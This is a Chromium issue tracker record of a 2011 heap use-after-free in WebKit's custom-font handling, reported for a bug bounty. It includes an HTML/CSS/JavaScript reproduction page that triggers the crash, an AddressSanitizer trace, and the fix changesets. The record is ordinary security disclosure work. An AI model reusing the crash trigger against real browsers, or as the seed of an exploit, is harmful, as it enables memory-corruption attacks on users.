# Generic fix: Register custom fonts at creation time, rather than retire time.

| Field | Value |
|-------|-------|
| **Issue ID** | [40050050](https://issues.chromium.org/issues/40050050) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-10-12 |
| **Bounty** | $1,337.00 |

## Description

**VULNERABILITY DETAILS**  

first-letter + missing font -> use-after-free

**VERSION**  

Chrome Version:  

Chromium 16.0.906.0 (Developer Build 105053)  

OS Linux  

WebKit 535.7 (trunk@97251)  

JavaScript V8 3.6.6.1

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<style>
@font-face { font-family: A; src: url(); }
#y { font-family: A; }
#y:first-letter {
content: "first-letter";
}
</style>
</head>
<body>
<div id="y">content</div>
</body>
 <script>
document.designMode='on'
document.execCommand('selectall')
</script>
 <style>
#y:before {
content: "before";
}
</style>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==23283== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffe379a890 at pc 0x7ffff3533827 bp 0x7fffffff7510 sp 0x7fffffff74e0  

READ of size 4 at 0x7fffe379a890 thread T0  

#0 0x7ffff3533827 in WebCore::FontMetrics::hasIdenticalAscentDescentAndLineGap(WebCore::FontMetrics const&) const ???:0

0x7fffe379a890 is located 16 bytes inside of 1208-byte region [0x7fffe379a880,0x7fffe379ad38)  

freed by thread T0 here:  

#0 0x7ffff5db2e56 in free *asan\_rtl*  

#1 0x7ffff34df2dd in WebCore::CSSFontFaceSource::pruneTable() ???:0

## Attachments

- [first-letter.txt](attachments/first-letter.txt) (text/x-c; charset=us-ascii, 9.9 KB)
- [first-letter.html](attachments/first-letter.html) (text/html; charset=us-ascii, 410 B)

## Timeline

### in...@chromium.org (2011-10-12)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-10-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-10-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-10-13)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-10-13)

Fixed in http://trac.webkit.org/changeset/97402

merged to m15 in http://trac.webkit.org/changeset/97403

### sc...@gmail.com (2011-10-19)

@miaubiz: thanks for harassing us to the extend of applying a generic fix for this class of bugs. $1337 for this hopefully now closed chapter

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-10-19)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-28)

Payment in system, can take up to a couple of weeks.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### la...@google.com (2013-01-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/100059?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/100241, crbug.com/chromium/99018]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050050)*
